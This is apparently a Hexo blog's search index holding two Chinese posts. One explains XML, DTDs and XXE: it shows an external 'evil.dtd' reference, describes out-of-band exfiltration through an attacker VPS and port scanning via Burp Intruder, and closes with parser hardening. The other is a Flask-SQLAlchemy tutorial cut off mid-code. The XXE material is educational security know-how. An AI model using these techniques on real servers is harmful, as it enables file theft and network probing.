<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>xml基本知识以及XXE漏洞</title>
      <link href="/2019/06/01/xml%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8AXXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/06/01/xml%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8AXXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>第一次XXE漏洞<br><a id="more"></a></p><p>xml是可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。</p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括<strong>XML声明、DTD文档类型定义（可选）、文档元素</strong>。</p><h4 id="xml文档的构建模块"><a href="#xml文档的构建模块" class="headerlink" title="xml文档的构建模块"></a>xml文档的构建模块</h4><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA</li><li>CDATA</li></ul><ol><li><p>元素元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>my blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">writer</span>&gt;</span>r1ght0us is best<span class="tag">&lt;/<span class="name">writer</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"r1ght0us.gif"</span> /&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>实体<br>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p></li><li>PCDATA<br>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</li><li>CDATA<br>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</li></ol><p><strong>DTD(文档类型定义)</strong></p><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><ol><li>内部声明：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li></ol><p>完整实例：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;<span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT to      (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT from    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT body    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ol start="2"><li><p>外部声明（引用外部DTD）：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><p>ex: <code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></p></li></ol><p>完整实例:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>而note.dtd的内容为:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span> (<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><p><strong>DTD实体</strong></p><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。<br>实体又分为一般实体和参数实体</p><ol><li>一般实体的声明语法: <code>&lt;!ENTITY 实体名 &quot;实体内容“&gt;</code></li><li>引用实体的方式：&amp;实体名；</li><li>参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY % 实体名 “实体内容“&gt;<br>引用实体的方式：%实体名；   </li><li>内部实体声明:&lt;!ENTITY 实体名称 “实体的值”&gt; ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></li></ol><p>完整实例:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY writer "r1ght0us"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY BLOG "http://r1ght0us.xyz"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ol start="5"><li>外部实体声明:<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></li></ol><p>完整实例:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY writer SYSTEM "https://github.com/r1ght0us"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY handsome SYSTEM "http://www.chenguanxin.com"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p><ol start="6"><li><p>关于XML的几个注意点：</p><ul><li>所有的XML标记必须要闭合标签</li><li>所有的XML的标签对大小写敏感</li><li>XML的属性值必须要加引号</li><li>在XML中的五个符号需要实体引用</li></ul></li></ol><table><thead><tr><th style="text-align:center">实体引用</th><th style="text-align:center">符号</th><th style="text-align:center">中文解释</th></tr></thead><tbody><tr><td style="text-align:center"><code>&amp;lt;</code></td><td style="text-align:center">&lt;</td><td style="text-align:center">小于号</td></tr><tr><td style="text-align:center"><code>&amp;gt;</code></td><td style="text-align:center">&gt;</td><td style="text-align:center">大于号</td></tr><tr><td style="text-align:center"><code>&amp;amp;</code></td><td style="text-align:center">&amp;</td><td style="text-align:center">和号</td></tr><tr><td style="text-align:center"><code>&amp;apos;</code></td><td style="text-align:center">‘</td><td style="text-align:center">单引号</td></tr><tr><td style="text-align:center"><code>&amp;quot;</code></td><td style="text-align:center">“</td><td style="text-align:center">双引号</td></tr></tbody></table><h4 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h4><blockquote><p>如何构建XXE</p></blockquote><ol><li>直接通过DTD外部实体声明（针对有回显的情况）</li></ol><p><img src="/2019/06/01/xml基本知识以及XXE漏洞/1.png" alt=""><br>下图为一个XXE-labs中的测试<br><img src="/2019/06/01/xml基本知识以及XXE漏洞/4.png" alt=""></p><ol start="2"><li>外部文档类型定义（DTD）文件可被用于触发OOB XXE。攻击者将.dtd文件托管在VPS上，使远程易受攻击的服务器获取该文件并执行其中的恶意命令。（不进行回显）<br><img src="/2019/06/01/xml基本知识以及XXE漏洞/2.png" alt=""><br>外部DTD的内容<br><img src="/2019/06/01/xml基本知识以及XXE漏洞/3.png" alt=""><br>其中php是伪协议不必多说。大概说一下原理，因为实战中大部分都是不进行回显，那么我们可以让服务器主动请求攻击者的VPS。那么我们让服务器引用写在VPS的DTD然后他会将payload加载，然后带进并访问我们的VPS，然后我们的VPS查看access_log可以接受到payload返回信息<br><img src="/2019/06/01/xml基本知识以及XXE漏洞/7.png" alt=""></li><li>端口扫描</li></ol><p>BP中的intruder模块设置如下<br><img src="/2019/06/01/xml基本知识以及XXE漏洞/5.png" alt=""><br>因为其连接特性，如果一个端口开放会进行很快的响应，如果未开放，会进行多次连接进行到一定次数才会显示连接失败。那么爆破可以根据其完成一次相应的时间。<br><strong>由于网络延时 or 某些协议的特有的连接方式，会显示不是特别精确有一定的误差</strong></p><p>爆破如下所示<br><img src="/2019/06/01/xml基本知识以及XXE漏洞/6.png" alt=""></p><h4 id="防御XXE漏洞"><a href="#防御XXE漏洞" class="headerlink" title="防御XXE漏洞"></a>防御XXE漏洞</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python：</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure><p>或者是将关键词 ex:<code>DOCYPE,ENTITY</code>进行过滤。</p>]]></content>
      
      
      <categories>
          
          <category> XML注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XML </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask之数据库</title>
      <link href="/2019/01/26/flask%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2019/01/26/flask%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>flask深入学习之第四部分<br><a id="more"></a></p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h3 id="使用Flask-SQLAlchemy管理数据库"><a href="#使用Flask-SQLAlchemy管理数据库" class="headerlink" title="使用Flask-SQLAlchemy管理数据库"></a>使用Flask-SQLAlchemy管理数据库</h3><p><code>Flask-SQLAlchemy</code>是一个Flask扩展，简化了在Flask程序中使用SQLAlchemy的操作。SQLAlchemy是一个很强大的关系型数据库框架，支持多种数据库后台。SQLAlchemy提供了高层ORM，也提供了使用数据库原生SQL的低层功能。</p><p>使用pip安装此扩展<code>pip install flask-sqlalchemy</code></p><p>在Flask-SQLAlchemy中，数据库使用URL指定。最流行的数据库引擎采用的数据库URL格式如表</p><table><thead><tr><th>数据库引擎</th><th>URL</th></tr></thead><tbody><tr><td>MySQL</td><td>mysql://username:password@hostname/database</td></tr><tr><td>Postgres</td><td>postgresql://username:password@hostname/database</td></tr><tr><td>SQLite（Unix）</td><td>sqlite:////absolute/path/to/database</td></tr><tr><td>SQLite（Windows）</td><td>sqlite:///c:/absolute/path/to/database</td></tr></tbody></table><p>在这些URL中，hostname 表示MySQL服务所在的主机，可以是本地主机（localhost），也可以是远程服务器。数据库服务器上可以托管多个数据库，因此database 表示要使用的数据库名。如果数据库需要进行认证，username和password表示数据库用户密令。</p><blockquote><p>SQLite数据库不需要使用服务器，因此不用指定hostname、username和password。URL中的database 是硬盘上文件的文件名。</p></blockquote><p>程序使用的数据库URL 必须保存到Flask 配置对象的<code>SQLALCHEMY_DATABASE_URI</code>键中。配置对象中还有一个很有用的选项，即<code>SQLALCHEMY_COMMIT_ON_TEARDOWN</code>键，将其设为True时，每次请求结束后都会自动提交数据库中的变动。</p><p>配置数据库如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.ext.sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] =<span class="string">'sqlite:///'</span> + os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_COMMIT_ON_TEARDOWN'</span>] = <span class="keyword">True</span></span><br><span class="line">db = SQLAlchemy(app)</span><br></pre></td></tr></table></figure></p><p><code>db对象</code>是SQLAlchemy类的实例，表示程序使用的数据库，同时还获得了Flask-SQLAlchemy提供的所有功能。</p><p>这里我使用的是MySQL数据库与sqlite不同，MySQL使用，应将上面的<code>SQLALCHEMY_DATABASE_URI</code>改为：<code>mysql+pymysql://username:password@host/database</code><br>因此还要安装pymysql；<code>pip install pymysql</code></p><hr><h3 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h3><p><strong>模型</strong>这个术语表示程序使用的持久化实体。在ORM中，模型一般是一个Python类，类中的属性对应数据库表中的列。Flask-SQLAlchemy创建的数据库实例为模型提供了一个基类以及一系列辅助类和辅助函数，可用于定义模型的结构。</p><p><img src="https://img0.tuicool.com/NrMJ3y.png!web" alt="Role与User"></p><p>如下所示，定义一个Role和User模型<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'roles'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;Role %r&gt;'</span> % self.name</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="keyword">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="keyword">True</span>, index=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;User %r&gt;'</span> % self.username</span><br></pre></td></tr></table></figure></p><p>类变量<code>__tablename__</code>定义在数据库中使用的表名。如果没有定义<strong>tablename</strong>，Flask-SQLAlchemy会使用一个默认名字，但默认的表名没有遵守使用复数形式进行命名的约定，所以最好由我们自己来指定表名。其余的类变量都是该模型的属性，被定义为<code>db.Column</code>类的实例。</p><p><code>db.Column</code>类构造函数的第一个参数是数据库列和模型属性的类型。下表列出了一些可用的列类型以及在模型中使用的Python类型。</p><table><thead><tr><th>类型名</th><th>Python类型</th><th>说明</th></tr></thead><tbody><tr><td>Integer</td><td>int</td><td>普通整数，一般是32位</td></tr><tr><td>SmallInteger</td><td>int</td><td>取值范围小的整数，一般是16位</td></tr><tr><td>BigInteger</td><td>int或long</td><td>不限制精度的整数</td></tr><tr><td>Float</td><td>float</td><td>浮点数</td></tr><tr><td>Numeric</td><td>decimal.Decimal</td><td>定点数</td></tr><tr><td>String</td><td>str</td><td>变长字符串</td></tr><tr><td>Text</td><td>str</td><td>变长字符串，对较长或不限长度的字符串做了优化</td></tr><tr><td>Unicode</td><td>unicode</td><td>变长Unicode字符串</td></tr><tr><td>UnicodeText</td><td>unicode</td><td>变长Unicode字符串，对较长或不限长度的字符串做了优化</td></tr><tr><td>Boolean</td><td>bool</td><td>布尔值</td></tr><tr><td>Date</td><td>datetime.date</td><td>日期</td></tr><tr><td>Time</td><td>datetime.time</td><td>时间</td></tr><tr><td>DateTime</td><td>datetime.datetime</td><td>日期和时间</td></tr><tr><td>Interval</td><td>datetime.timedelta</td><td>时间间隔</td></tr><tr><td>Enum</td><td>str</td><td>一组字符串</td></tr><tr><td>PickleType</td><td>任何Python对象</td><td>自动使用Pickle序列化</td></tr><tr><td>LargeBinary</td><td>str</td><td>二进制文件</td></tr></tbody></table><p><code>db.Column</code>中其余的参数指定属性的配置选项如下：</p><table><thead><tr><th>选项名</th><th>说明</th></tr></thead><tbody><tr><td>primary_key</td><td>如果设为True，这列就是表的主键</td></tr><tr><td>unique</td><td>如果设为True，这列不允许出现重复的值</td></tr><tr><td>index</td><td>如果设为True，为这列创建索引，提升查询效率</td></tr><tr><td>nullable</td><td>如果设为True，这列允许使用空值；如果设为False，这列不允许使用空值</td></tr><tr><td>default</td><td>为这列定义默认值</td></tr></tbody></table><p>虽然没有强制要求，但这两个模型都定义了<code>__repr()__</code>方法，返回一个具有可读性的字符串表示模型，可在调试和测试时使用。</p><hr><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><p>关系型数据库使用关系把不同表中的行联系起来。再上图所示的关系图表示用户和角色之间的一种简单关系。这是角色到用户的一对多关系，因为一个角色可属于多个用户，而每个用户都只能有一个角色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">'roles.id'</span>))</span><br></pre></td></tr></table></figure><p>关系使用users表中的外键连接了两行。添加到User模型中的<code>role_id</code>列被定义为外键，就是这个外键建立起了关系。传给<code>db.ForeignKey()</code>的参数<code>roles.id</code>表明，这列的值是roles表中行的id值。<br>添加到Role模型中的users属性代表这个关系的<strong>面向对象视角</strong>。对于一个Role类的实例，其users属性将返回与角色相关联的用户组成的列表。<code>db.relationship()</code>的第一个参数表明这个关系的另一端是哪个模型。如果模型类尚未定义，可使用字符串形式指定。<br><code>db.relationship()</code>中的<code>backref</code>参数向User模型中添加一个role属性，从而定义<strong>反向关系</strong>。这一属性可替代role_id访问Role模型，此时获取的是模型对象，而不是外键的值。<br>大多数情况下，db.relationship()都能自行找到关系中的外键，但有时却无法决定把哪一列作为外键。如果无法决定外键，你就要为db.relationship()提供额外参数，从而确定所用外键。如下所示：</p><table><thead><tr><th>选项名</th><th>说明</th></tr></thead><tbody><tr><td>backref</td><td>在关系的另一个模型中添加反向引用</td></tr><tr><td>primaryjoin</td><td>明确指定两个模型之间使用的联结条件。只在模棱两可的关系中需要指定</td></tr><tr><td>lazy</td><td>指定如何加载相关记录。可选值有select（首次访问时按需加载）、immediate（源对象加载后就加载）、joined（加载记录，但使用联结）、subquery（立即加载，但使用子查询），noload（永不加载）和dynamic（不加载记录，但提供加载记录的查询）</td></tr><tr><td>uselist</td><td>如果设为Fales，不使用列表，而使用标量值</td></tr><tr><td>order_by</td><td>指定关系中记录的排序方式</td></tr><tr><td>secondary</td><td>指定多对多关系中关系表的名字</td></tr><tr><td>secondaryjoin</td><td>SQLAlchemy无法自行决定时，指定多对多关系中的二级联结条件</td></tr></tbody></table><hr><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><ol><li>创建表<br>首先，我们要让Flask-SQLAlchemy根据模型类创建数据库。方法是使用<code>db.create_all()</code>函数：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(venv) $ python hello.py shell</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hello <span class="keyword">import</span> db</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.create_all()</span><br></pre></td></tr></table></figure></li></ol><p>在使用python shell时，需要将<code>app</code>参数导入至flask-script中的<code>Manager</code>类中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask-script <span class="keyword">import</span> Manager</span><br><span class="line"><span class="comment"># .....</span></span><br><span class="line">manager = Manager(app)</span><br><span class="line"><span class="comment">#....</span></span><br><span class="line"><span class="keyword">if</span> __name__=<span class="string">"__main__"</span>:</span><br><span class="line">    manager.run()</span><br></pre></td></tr></table></figure></p><ol start="2"><li><p>删除表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.drop_all()</span><br></pre></td></tr></table></figure></li><li><p>插入行<br>下面这些代码将创建Role和User</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hello <span class="keyword">import</span> Role, User </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>admin_role = Role(name=<span class="string">'Admin'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mod_role = Role(name=<span class="string">'Moderator'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_role = Role(name=<span class="string">'User'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_john = User(username=<span class="string">'john'</span>, role=admin_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_susan = User(username=<span class="string">'susan'</span>, role=user_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_david = User(username=<span class="string">'david'</span>, role=user_role)</span><br></pre></td></tr></table></figure></li></ol><p>模型的构造函数接受的参数是使用关键字参数指定的模型属性初始值。注意，role属性也可使用，虽然它不是真正的数据库列，但却是一对多关系的高级表示。但是这些改动并未写入数据库中，需要通过数据库<strong>会话管理</strong>对数据库所做的改动，会话由<code>db.session</code>表示。准备把对象写入数据库之前，先要将其添加到会话中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(admin_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(mod_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_john)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_susan)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_david)</span><br></pre></td></tr></table></figure></p><p>为了把对象写入数据库，我们要调用<code>commit()</code>方法提交会话：<br><code>&gt;&gt;&gt; db.session.commit()</code></p><blockquote><p>数据库会话也可回滚。调用db.session.rollback()后，添加到数据库会话中的所有对象都会还原到它们在数据库时的状态。</p></blockquote><ol start="4"><li><p>修改行<br>在数据库会话上调用add()方法也能更新模型。我们继续在之前的shell会话中进行操作，<br>下面这个例子把”Admin”角色重命名为”Administrator”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>admin_role.name = <span class="string">'Administrator'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(admin_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>删除行<br>数据库会话还有个delete()方法。下面这个例子把”Moderator”角色从数据库中删除：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.delete(mod_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.commit()</span><br></pre></td></tr></table></figure></li><li><p>查询行<br>Flask-SQLAlchemy为每个模型类都提供了query对象。<strong>最基本的模型查询</strong>是取回对应表中的所有记录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Role.query.all()</span><br><span class="line">[&lt;Role <span class="string">u'Administrator'</span>&gt;, &lt;Role <span class="string">u'User'</span>&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>User.query.all()</span><br><span class="line">[&lt;User <span class="string">u'john'</span>&gt;, &lt;User <span class="string">u'susan'</span>&gt;, &lt;User <span 